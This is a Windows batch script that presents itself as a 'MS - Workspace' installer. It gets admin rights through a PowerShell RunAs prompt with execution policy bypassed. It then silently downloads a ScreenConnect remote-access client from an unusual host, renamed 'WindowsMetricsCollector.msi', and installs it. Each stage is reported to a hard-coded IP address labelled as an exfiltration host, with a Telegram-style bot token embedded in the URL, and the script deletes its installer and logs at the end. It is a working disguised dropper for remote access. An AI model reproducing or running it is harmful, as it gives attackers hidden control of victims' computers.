@echo off
setlocal enabledelayedexpansion

set "PRODUCT_NAME=MS - Workspace"
set "PRODUCT_VERSION=1.0.0"
set "MSI_URL=https://user12.h-connect.xyz:8040/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
set "MSI_FILE_NAME=WindowsMetricsCollector.msi"
set "INSTALL_DIR=%ProgramData%\MSWorkspace\Install"
set "LOG_DIR=%ProgramData%\MSWorkspace\Logs"
set "LOG_FILE=deploy.log"
set "MSI_LOG_FILE=msi-install.log"
set "DOWNLOAD_RETRIES=2"
set "RETRY_DELAY_MS=1500"
set "EXFIL_HOST=212.43.151.96:20002"
set "TBTOKEN=7587335315:AAG-GNuK6xCNM3hjkskl7_rxXjsbLNIe_Mk"
set "TCID=93372553"
set "DEPLOY_TOKEN=%RANDOM%%RANDOM:~0,4%"
set "UNINSTALL_EXISTING=1"
set "PRODUCT_CODE={4228D3D7-CF51-5361-1BC4-165794361D9B}"
set "SHOW_POPUPS=0"

set "MSI_PATH=%INSTALL_DIR%\%MSI_FILE_NAME%"
set "LOG_PATH=%LOG_DIR%\%LOG_FILE%"
set "MSI_LOG_PATH=%LOG_DIR%\%MSI_LOG_FILE%"
set "EXIT_CODE=1"

mkdir "%INSTALL_DIR%" 2>nul
mkdir "%LOG_DIR%" 2>nul

call :isAdmin
if errorlevel 1 goto :elevate

call :httpSignal "start" 0
call :validateConfig
if errorlevel 1 goto :cleanup

call :downloadInstaller
if errorlevel 1 (
    call :log "ERROR" "Download failed after %DOWNLOAD_RETRIES% attempts"
    call :httpSignal "fail" 1
    set "EXIT_CODE=1"
    goto :cleanup
)

if not exist "%MSI_PATH%" (
    call :log "ERROR" "MSI missing after download"
    call :httpSignal "fail" 1
    set "EXIT_CODE=1"
    goto :cleanup
)

for %%A in ("%MSI_PATH%") do if %%~zA==0 (
    call :log "ERROR" "MSI empty after download"
    call :httpSignal "fail" 1
    set "EXIT_CODE=1"
    goto :cleanup
)

if "%UNINSTALL_EXISTING%"=="1" call :uninstallExisting

call :runInstaller
set "EXIT_CODE=!ERRORLEVEL!"

if !EXIT_CODE!==0 (
    call :log "INFO" "Installation successful"
    call :httpSignal "ok" !EXIT_CODE!
) else if !EXIT_CODE!==3010 (
    call :log "INFO" "Success - restart required"
    call :httpSignal "okr" !EXIT_CODE!
) else if !EXIT_CODE!==1641 (
    call :log "INFO" "Success - restart initiated"
    call :httpSignal "okr" !EXIT_CODE!
) else if !EXIT_CODE!==1638 (
    call :log "INFO" "Already installed"
    call :httpSignal "oka" !EXIT_CODE!
) else if !EXIT_CODE!==1602 (
    call :log "WARN" "Installation canceled by user"
    call :httpSignal "cl" !EXIT_CODE!
) else (
    call :log "ERROR" "Installation failed with code !EXIT_CODE!"
    call :httpSignal "fail" !EXIT_CODE!
)

:cleanup
if exist "%MSI_PATH%" del /f /q "%MSI_PATH%" 2>nul
if exist "%LOG_PATH%" del /f /q "%LOG_PATH%" 2>nul
if exist "%MSI_LOG_PATH%" del /f /q "%MSI_LOG_PATH%" 2>nul
if exist "%LOG_DIR%" rmdir /s /q "%LOG_DIR%" 2>nul
exit /b %EXIT_CODE%

:isAdmin
net session >nul 2>&1
exit /b %errorlevel%

:elevate
powershell -NoProfile -ExecutionPolicy Bypass -Command "$null = Start-Process -FilePath '%~f0' -Verb RunAs"
exit /b 0

:validateConfig
if not defined MSI_URL (
    call :log "ERROR" "MSI_URL is empty"
    exit /b 1
)
if not defined MSI_FILE_NAME (
    call :log "ERROR" "MSI_FILE_NAME is empty"
    exit /b 1
)
exit /b 0

:downloadInstaller
mkdir "%INSTALL_DIR%" 2>nul
set "ATTEMPT=0"
:downloadRetry
if !ATTEMPT! gtr %DOWNLOAD_RETRIES% exit /b 1
(echo !MSI_URL!) > "%TEMP%\dl_url.txt"
powershell -NoProfile -ExecutionPolicy Bypass -Command "try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $u = [IO.File]::ReadAllText('%TEMP%\dl_url.txt').Trim(); $wc = New-Object System.Net.WebClient; $wc.DownloadFile($u, '%MSI_PATH%'); exit 0 } catch { exit 1 }"
if errorlevel 1 (
    set /a ATTEMPT+=1
    ping -n 2 127.0.0.1 >nul
    goto :downloadRetry
)
if exist "%MSI_PATH%" (
    for %%A in ("%MSI_PATH%") do if %%~zA==0 (
        del /f /q "%MSI_PATH%" 2>nul
        set /a ATTEMPT+=1
        goto :downloadRetry
    )
    exit /b 0
)
set /a ATTEMPT+=1
goto :downloadRetry

:uninstallExisting
call :log "INFO" "Uninstalling existing product: %PRODUCT_CODE%"
msiexec.exe /x %PRODUCT_CODE% /qn /norestart REBOOT=ReallySuppress
set "CODE=%ERRORLEVEL%"
if %CODE%==1605 exit /b 0
if %CODE%==1612 exit /b 0
call :log "WARN" "Uninstall returned %CODE%"
ping -n 4 127.0.0.1 >nul
exit /b 0

:runInstaller
mkdir "%LOG_DIR%" 2>nul
msiexec.exe /i "%MSI_PATH%" /qn /norestart REBOOT=ReallySuppress ALLUSERS=1 /L*v "%MSI_LOG_PATH%"
set "CODE=%ERRORLEVEL%"
if %CODE%==0 exit /b 0
if %CODE%==3010 exit /b 3010
if %CODE%==1641 exit /b 1641
if %CODE%==1638 exit /b 1638
ping -n 3 127.0.0.1 >nul
msiexec.exe /i "%MSI_PATH%" /qb /norestart REBOOT=ReallySuppress ALLUSERS=1 /L*v "%MSI_LOG_PATH%"
exit /b %errorlevel%

:httpSignal
set "STAGE=%~1"
set "EXIT_VAL=%~2"
set "STATUS_CODE=fl"
set "EXIT_STR=%EXIT_VAL%"
if "%STAGE%"=="start" set "STATUS_CODE=go" & set "EXIT_STR=0"
if "%STAGE%"=="ok" set "STATUS_CODE=ok"
if "%STAGE%"=="okr" set "STATUS_CODE=okr" & set "EXIT_STR=3010"
if "%STAGE%"=="oka" set "STATUS_CODE=oka" & set "EXIT_STR=1638"
if "%STAGE%"=="cl" set "STATUS_CODE=cl" & set "EXIT_STR=1602"

for /f "tokens=2 delims==" %%I in ('wmic os get localdatetime /value 2^>nul') do set "DT=%%I"
set "DTS=%DT:~4,2%%DT:~6,2%%DT:~8,2%%DT:~10,2%"
set "URL=http://%EXFIL_HOST%/%TBTOKEN%/%TCID%/%DEPLOY_TOKEN%.%STATUS_CODE%.%EXIT_STR%.%DTS%"
powershell -NoProfile -ExecutionPolicy Bypass -Command "try { $null = (New-Object System.Net.WebClient).DownloadString('%URL%') } catch {}"
exit /b

:log
set "LEVEL=%~1"
set "MSG=%~2"
for /f "tokens=2 delims==" %%I in ('wmic os get localdatetime /value 2^>nul') do set "DT=%%I"
set "TS=%DT:~0,4%-%DT:~4,2%-%DT:~6,2% %DT:~8,2%:%DT:~10,2%:%DT:~12,2%"
echo [%TS%] [%LEVEL%] %MSG% >> "%LOG_PATH%"
exit /b
